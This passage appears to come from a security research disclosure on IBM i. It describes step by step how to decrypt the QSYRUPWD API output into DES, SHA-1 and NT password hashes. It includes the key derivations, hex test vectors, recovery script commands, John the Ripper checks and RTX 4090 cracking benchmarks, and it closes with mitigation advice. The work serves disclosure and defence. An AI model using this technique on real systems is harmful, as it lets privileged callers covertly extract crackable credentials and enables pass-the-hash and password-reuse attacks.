1.  Parse the `QSYRUPWD` output into fields Treat the returned `QSYRUPWD` buffer as a structured container and extract the fields identified during the reversing process: the two size fields, the username in EBCDIC (padded to 10 bytes with 0x40), the result of the `2nd QSYRUPWD` CIPHER, Zero_1, the fixed marker `0x05`, the result of the `3rd QSYRUPWD` CIPHER, Zero_2, the fixed marker `0x0240F0` (0x02 if `QPWDLVL = 2`, 0x04 if `QPWDLVL = 4`), the result of the `QZLSRTPW 3rd CIPHER`, the updated chaining value of the `QZLSRTPW 3rd CIPHER`, the result of the `QSYRUPWD 5th CIPHER`, the zero-filled padding area, and finally the 20-byte result of the `1st QSYRUPWD CIPHER`. This parsing step is important because the later decryption steps reuse these embedded values in the same dependency order in which QSYRUPWD originally produced them.
    
2.  Derive the AES-128 key material from the `1st QSYRUPWD CIPHER` result The 20-byte output of the `1st QSYRUPWD CIPHER` (`4822BDC0C3F143547BE52989CA747F8253B97367` in the test vector) acts as the crypto key base material for the later `QSYRUPWD CIPHER` stages. `QSYRUPWD` does not use this value as one continuous block; instead, it derives 16-byte keys by deterministic slice-based byte reordering. For the `2nd QSYRUPWD CIPHER`, the key is `D[1..4] || D[6..9] || D[11..14] || D[16..19]`. For the `3rd QSYRUPWD CIPHER`, the key is the reverse-order variant `D[16..19] || D[11..14] || D[6..9] || D[1..4]`. For the 5th QSYRUPWD CIPHER, the key material is rearranged again as `D[17..20] || D[1..4] || D[12..15] || D[6..9]`. The bytes themselves are not modified; only their positions are rearranged.
    
3.  Decrypt the SHA-1 block The SHA-1 field in the `QSYRUPWD` output has the form:
    
    ```
    0x05 || encrypted_16_bytes || 2-byte suffix
    ```
    
    The reversing results show that the `3rd QSYRUPWD CIPHER` operation applies AES-128 in ECB mode to the middle 16-byte portion of that field, using the reversed 16-byte key derived from the output of the `1st QSYRUPWD CIPHER`. To recover the SHA-1 hash in a format usable by John the Ripper, decrypt the 16-byte encrypted core with AES-128-ECB using that derived key, then reconstruct the full 20-byte value as:
    
    ```
    prefix || recovered_middle_16_bytes || suffix
    ```
    
    In the test case, this yields a valid SHA-1 hash representation suitable for John the Ripper.
    
4.  Decrypt the DES block The DES-related field in the `QSYRUPWD` output is the 16-byte result of the `2nd QSYRUPWD CIPHER`. The reversing results show that this stage uses AES-128 in ECB mode with the forward slice-derived 16-byte key built from the `1st QSYRUPWD CIPHER` output. Decrypting this 16-byte block yields the fixed 0x44 marker followed by the user’s DES-derived password value, padded with 0x40 as needed. Removing the fixed marker and any trailing 0x40 padding yields the effective DES value. The first 8 bytes of that recovered DES value are then reused in the NT-related key derivation.
    
5.  Decrypt the NT hash block The `NT ciphertext` area is the result of the `5th QSYRUPWD CIPHER`. The reversing results show that this stage uses Rijndael-256 in CBC mode with a 32-byte key and a 32-byte IV. The required key material is derived from the username and the recovered legacy 8-byte DES password value using the inferred 32-byte structure described earlier in the document. After deriving that structure, use it as the Rijndael-256 key/IV material required by the final NT decryption step. The resulting plaintext contains a recognizable internal layout, including a small static prefix and the 16-byte NT hash, allowing reliable extraction of the NT value.
    
6.  Output the recovered hashes After following the chain in the original dependency order, the `QSYRUPWD` output can be converted back into the password-related values embedded in it. In practice, this means recovering the DES-derived value from the `2nd QSYRUPWD CIPHER` block, the SHA-1-related value from the `3rd QSYRUPWD CIPHER` block, and the NT hash from the `5th QSYRUPWD CIPHER` block. These recovered values can then be formatted for follow-on analysis, including password cracking workflows and pass-the-hash style use cases where applicable.

The command below is abbreviated for readability: the literal “…” represents the omitted zero-filled region, while the script requires the complete 2000-byte hexadecimal input:

```
python ibmi-passwords-level2.py 000007D0000007D0E4E2C5D9C2F140404040448C659794FE63A3F5C16853ACFCB77E7F000000000000000000000000000000000005B89EACA7145D3C3277397B3BE11B8AE2CCBB404800000000000000000000000000000000000000000240F0124C5A7DB02D8ACF63F74AA208CB51957A7086ADD7756695C2E347A9CBD0F685F70B30C86C0BE8EDBA81D961AD6F9407B8A515EB5E2E3B472E5DFE8B84C1CBD338791BC974C0DD90D5E505F4E5124DB1D150915577E448A10A86F1E5A8D3533317313763B4C60EC1C4E26FA32266195B7CAA42D89F384D9069636BB3069B3398B01F949E6942108D3BE55081A7AA61BCF15B8094C4372A8B24668CC6B96DEEE1D167EE159904700A6BF4726CF2DCC54985BBB0F489ECB6193B4841CE617D93A61BEB86A9D9EE34C1B4693042E7FB2A24608C5A61A9DA97891DE288EF078CBB0798ECADAFC988A95F52A22DE307B992745236CE9249D0E60E3C71C99CC0688F6A00...004822BDC0C3F143547BE52989CA747F8253B97367

USERB1:B89E7B4BD4159A06900908F57CA0DB0D19E84048:7585F62F8845A794:2D8C32FBB32A5E4385629E700A4F9496
```

I checked the hashes with John the Ripper using the NT, `as400-des`, and `as400-ssha1` formats, and everything worked as expected. The program can crack the password based on the recovered hashes.

An important implication of this result is that the decryption chain can be driven entirely from the QSYRUPWD API output itself. In practice, the same parsing and dependency preserving reconstruction logic is not limited to `QPWDLVL = 2`: as long as the required encrypted fields and chaining material are present in the returned buffer, the method remains applicable at higher password levels as well.

I also validated the recovery process on a system configured with `QPWDLVL = 4`:

```
000007D0:size1 returned bytes length
000007D0:size2
C4C5D4D6E4E2C5D94040: Username in EBCDIC, padded to 10 bytes with 0x40.
44:fixed value
40404040404040404040404040404040: QSYRUPWD 2nd CIPHER field, NULLed
000000000000000000000000000000:Zero_1 (15 bytes)
000005:fixed 3-byte marker
4040404040404040404040404040404040404040: QSYRUPWD 3rd CIPHER field, NULLed
00000000000000000000000000000000:Zero_2 (16 bytes)
000000000440F0:fixed 7-byte level marker for QPWDLVL = 4
9744316DE8A2F732520F770DB979CD4B6CABB5C92EEDB1B63257BDB7BC35D13B0B8802BC60B8A67FA7A000C1BB3A89E311CA3F48B55F53F23946769E718F5D3561DD95503A579BC9AD16D4318695A02F323725D7407E1E891536821B001744318D18787E26D7E1B770B27E44AEECA5E6BA45B0AA253D65FA7E4634F5F49BDCCE917CE675585A339942099947F44C9AA80741A3EF4C23286F03C113C2ADD6704B: Result of the QZLSRTPW 3rd CIPHER
85234D0DD8977341E1C2858F78FB0554C5D5DDE9B52447560C6DDEB0F08C99BF: Updated chaining value of the QZLSRTPW 3rd CIPHER
7EEDD7384635FB4029C8F9F9E13E011EA20EE04A4ACCE2261C5D1754CA7D4AAFA177D1896EDA587A31E1A945BC2A045543DBFAFBA6205B92732A2A59151DBB96: Result of the QSYRUPWD 5th CIPHER
[1628 zero bytes]:Zero_3
25A0AB04BF53ECF5B837ED4FF665189A9EC18229: Result of the QSYRUPWD 1st CIPHER
```

In this test case, the DES derived and SHA-1 based fields returned by `QSYRUPWD` were both filled with 0x40 bytes, and the level specific marker was 00 00 00 00 04 40 F0. The embedded 192-byte output of the `third QZLSRTPW CIPHER` operation was still present. Because no legacy DES derived value was available, the 32-byte Rijndael key was derived solely from the 10-byte EBCDIC username field: five 0x00 bytes, followed by 0x40 padding, the fixed 0x44 byte, and the sorted non-padding username bytes. For DEMOUSER, this produced the key 000000000040404040404040404040404040404040404044C4C5C5D4D6D9E2E4. The CBC initialization vector was MD5(username_ebcdic_10) repeated twice, resulting in FFD5084C0F0878A4D4B22E9B71293C7FFD5084C0F0878A4D4B22E9B71293C7. Decrypting the complete 192-byte block with Rijndael using a 256-bit block size and a 256-bit key recovered a plaintext containing two identical copies of the NT hash. This demonstrates that, in the tested `QPWDLVL = 4` configuration, the absence of the legacy DES- and SHA-1 derived fields does not prevent recovery of the NT password hash from the embedded QZLSRTPW data.

```
python ibmi-passwords-level4.py 000007D0000007D0C4C5D4D6E4E2C5D940404440404040404040404040404040404040000000000000000000000000000000000005404040404040404040404040404040404040404000000000000000000000000000000000000000000440F09744316DE8A2F732520F770DB979CD4B6CABB5C92EEDB1B63257BDB7BC35D13B0B8802BC60B8A67FA7A000C1BB3A89E311CA3F48B55F53F23946769E718F5D3561DD95503A579BC9AD16D4318695A02F323725D7407E1E891536821B001744318D18787E26D7E1B770B27E44AEECA5E6BA45B0AA253D65FA7E4634F5F49BDCCE917CE675585A339942099947F44C9AA80741A3EF4C23286F03C113C2ADD6704B85234D0DD8977341E1C2858F78FB0554C5D5DDE9B52447560C6DDEB0F08C99BF7EEDD7384635FB4029C8F9F9E13E011EA20EE04A4ACCE2261C5D1754CA7D4AAFA177D1896EDA587A31E1A945BC2A045543DBFAFBA6205B92732A2A59151DBB9600..0025A0AB04BF53ECF5B837ED4FF665189A9EC18229
```

The recovery script produced:

```
DEMOUSER:AA61E3443F91D4904F4700DF3856FE11
```

## Benchmarks

GPU-based password cracking can test enormous numbers of password candidates in parallel, making fast hash algorithms such as NTLM particularly vulnerable. A single RTX 4090 can process hundreds of billions of NTLM guesses per second under optimized conditions. Password hashing algorithms such as PBKDF2 reduce this advantage by applying many repeated computations to each guess. The effectiveness of a cracking attempt ultimately depends on the hash algorithm, iteration count, password complexity, and available GPU capacity.

These results came from a stock-clock RTX 4090 using Hashcat 6.2.6 with optimized kernels:

| GPU | Algorithm | Iterations | Measured speed | NT advantage |
| --- | --- | --- | --- | --- |
| RTX 4090 | NTLM | 1   | 288.5 GH/s | baseline |
| RTX 4090 | PBKDF2-HMAC-SHA1 | 999 | 19.12 MH/s | NT is 15,085× faster |
| RTX 4090 | PBKDF2-HMAC-SHA1 | 9,999 | 2.13 MH/s | NT is 135,452× faster |
| RTX 4090 | PBKDF2-HMAC-SHA256 | 999 | 8.87 MH/s | NT is 32,541× faster |
| RTX 4090 | PBKDF2-HMAC-SHA512 | 999 | 3.12 MH/s | NT is 92,441× faster |

For one stock RTX 4090, using Hashcat 6.2.6 optimized kernels and PBKDF2-HMAC-SHA1:

-   NTLM: approximately 288.5 billion candidates/second.
-   PBKDF2, 1,000 iterations: approximately 19.1 million candidates/second — NTLM is about 15,000× faster.
-   PBKDF2, 10,000 iterations: approximately 2.13 million candidates/second — NTLM is about 135,000× faster.
-   PBKDF2, 100,000 iterations: approximately 0.20–0.21 million candidates/second — about 200,000 candidates/second, NTLM is approximately 1.4 million× faster.

The first three values are measured RTX 4090 Hashcat results. The 100,000-iteration result is a linear estimate from the measured 9,999-iteration result; PBKDF2 cost scales approximately linearly with the iteration count:

| Algorithm | RTX 4090 speed |
| --- | --- |
| NTLM | 288.5 GH/s |
| PBKDF2-SHA1, 1,000 iterations | 19.12 MH/s |
| PBKDF2-SHA1, 10,000 iterations | 2.13 MH/s |
| PBKDF2-SHA1, 100,000 iterations | ≈200 kH/s |

## Conclusion

Calling `QSYRUPWD` requires both `*ALLOBJ` and `*SECADM` authority, so this is not an unauthenticated or low privilege attack. However, privileged administrative access does not normally imply knowledge of users’ original passwords. The reconstructed format allows an authorized caller to obtain offline crackable credential material without changing the password or alerting the user. Recovered passwords may also expose credentials reused on other IBM i partitions, Windows systems, directory services, or external applications. In the tested `QPWDLVL = 4` configuration, removing the legacy DES- and SHA-1 based fields did not prevent recovery of the NT hash from the embedded `QZLSRTPW` data. Organizations should therefore treat the combination of `*ALLOBJ` and `*SECADM` as access to exportable password verifier material, strictly limit and monitor profiles holding both authorities, review programs that may expose these authorities through adopted authority, and prevent password reuse between IBM i and other environments. A complete platform level mitigation would require IBM to redesign `QSYRUPWD` so that its output cannot be converted into reusable or offline crackable credential material.
